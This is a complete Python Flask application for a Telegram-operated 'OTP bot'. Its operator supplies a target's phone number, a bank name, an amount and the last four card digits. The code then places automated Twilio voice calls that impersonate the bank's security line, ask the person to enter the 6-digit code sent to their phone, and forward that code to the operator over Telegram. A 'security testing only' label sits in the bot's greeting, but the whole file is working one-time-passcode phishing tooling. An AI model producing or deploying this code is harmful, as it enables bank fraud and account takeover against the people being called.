import os
import json
import requests
from flask import Flask, request
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather

app = Flask(__name__)

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TWILIO_SID = os.environ.get('TWILIO_ACCOUNT_SID')
TWILIO_AUTH = os.environ.get('TWILIO_AUTH_TOKEN')
TWILIO_FROM = os.environ.get('TWILIO_FROM_NUMBER')
BASE_URL = os.environ.get('RENDER_URL', 'https://otp-getter.onrender.com')

# Store user conversation state
user_data = {}

# Helper: Send Telegram message
def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": text})
        print(f"Sent message to {chat_id}")
    except Exception as e:
        print(f"Telegram error: {e}")

# Helper: Make Twilio call
def make_twilio_call(to_number, bank_name, amount, card_last4, chat_id):
    client = Client(TWILIO_SID, TWILIO_AUTH)
    voice_url = f"{BASE_URL}/voice?bank={bank_name}&amount={amount}&card_last4={card_last4}&chat_id={chat_id}"
    call = client.calls.create(to=to_number, from_=TWILIO_FROM, url=voice_url, method='POST')
    return call.sid

# ==================== FLASK VOICE WEBHOOK ====================
@app.route("/voice", methods=['GET', 'POST'])
def voice():
    response = VoiceResponse()
    
    # If digits were entered (OTP captured)
    if 'Digits' in request.values:
        digits = request.values['Digits']
        chat_id = request.args.get('chat_id')
        print(f"✅ DIGITS CAPTURED: {digits} for chat_id: {chat_id}")
        
        if chat_id:
            send_telegram_message(chat_id, f"✅ OTP captured: {digits}")
        else:
            print("❌ No chat_id in request args!")
        
        response.say("Thank you. This code has been received. Goodbye.")
        response.hangup()
        return str(response)
    
    # No digits yet - first time entering the call
    bank_name = request.args.get('bank', 'your bank')
    amount = request.args.get('amount', '500')
    card_last4 = request.args.get('card_last4', '1234')
    chat_id = request.args.get('chat_id')
    
    print(f"📞 New call - Bank: {bank_name}, Amount: {amount}, Card: {card_last4}, Chat: {chat_id}")
    
    # IMPORTANT: Include the original parameters in the action URL
    action_url = f"/voice?bank={bank_name}&amount={amount}&card_last4={card_last4}&chat_id={chat_id}"
    
    gather = Gather(num_digits=6, action=action_url, method='POST', timeout=10)
    gather.say(f"Hello. This is an automated security call from {bank_name}.")
    gather.say(f"We detected a transaction of {amount} dollars on card ending in {card_last4}.")
    gather.say("Please enter the 6-digit code sent to your phone.")
    response.append(gather)
    
    # Fallback if no input
    response.say("No input received. Goodbye.")
    response.hangup()
    
    return str(response)

# ==================== TELEGRAM WEBHOOK ====================
@app.route("/webhook", methods=['POST'])
def webhook():
    try:
        update = request.get_json(force=True)
        print(f"Webhook received: {json.dumps(update)[:200]}")
        
        message = update.get('message', {})
        chat_id = message.get('chat', {}).get('id')
        text = message.get('text', '').strip()
        
        if not chat_id:
            return "ok", 200
        
        # Initialize user session
        if chat_id not in user_data:
            user_data[chat_id] = {'step': 'idle'}
        
        state = user_data[chat_id]
        
        # Handle /start
        if text == '/start':
            send_telegram_message(chat_id, "🔐 *OTP Testing Bot*\n\nSend /call to start.\n\n*For security testing only.*")
            user_data[chat_id] = {'step': 'idle'}
        
        # Handle /call
        elif text == '/call':
            send_telegram_message(chat_id, "📞 Send phone number (with country code, e.g., +447123456789)")
            user_data[chat_id] = {'step': 'awaiting_phone'}
        
        # Handle phone number
        elif state.get('step') == 'awaiting_phone':
            user_data[chat_id]['phone'] = text
            user_data[chat_id]['step'] = 'awaiting_bank'
            send_telegram_message(chat_id, "🏦 Send bank name (e.g., Chase, Santander)")
        
        # Handle bank name
        elif state.get('step') == 'awaiting_bank':
            user_data[chat_id]['bank'] = text
            user_data[chat_id]['step'] = 'awaiting_amount'
            send_telegram_message(chat_id, "💰 Send transaction amount (e.g., 1299.99)")
        
        # Handle amount
        elif state.get('step') == 'awaiting_amount':
            user_data[chat_id]['amount'] = text
            user_data[chat_id]['step'] = 'awaiting_card_last4'
            send_telegram_message(chat_id, "💳 Send last 4 digits of card number")
        
        # Handle card last 4 and make the call
        elif state.get('step') == 'awaiting_card_last4':
            user_data[chat_id]['card_last4'] = text
            phone = user_data[chat_id]['phone']
            bank = user_data[chat_id]['bank']
            amount = user_data[chat_id]['amount']
            card_last4 = user_data[chat_id]['card_last4']
            
            send_telegram_message(chat_id, f"📞 Calling {phone}...\nBank: {bank}\nAmount: ${amount}\nCard ending: {card_last4}")
            
            try:
                call_sid = make_twilio_call(phone, bank, amount, card_last4, chat_id)
                send_telegram_message(chat_id, f"✅ Call initiated! SID: {call_sid}\n\nWaiting for OTP entry...")
            except Exception as e:
                send_telegram_message(chat_id, f"❌ Call failed: {str(e)}")
            
            user_data[chat_id] = {'step': 'idle'}
        
        # Handle unknown
        else:
            send_telegram_message(chat_id, "Send /start to begin, or /call to start a new OTP test.")
        
        return "ok", 200
        
    except Exception as e:
        print(f"Webhook error: {e}")
        return "error", 500

@app.route("/")
def index():
    return "OTP Bot is running."

@app.route("/health")
def health():
    return "OK", 200

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    print(f"Starting OTP bot on port {port}")
    app.run(host='0.0.0.0', port=port)
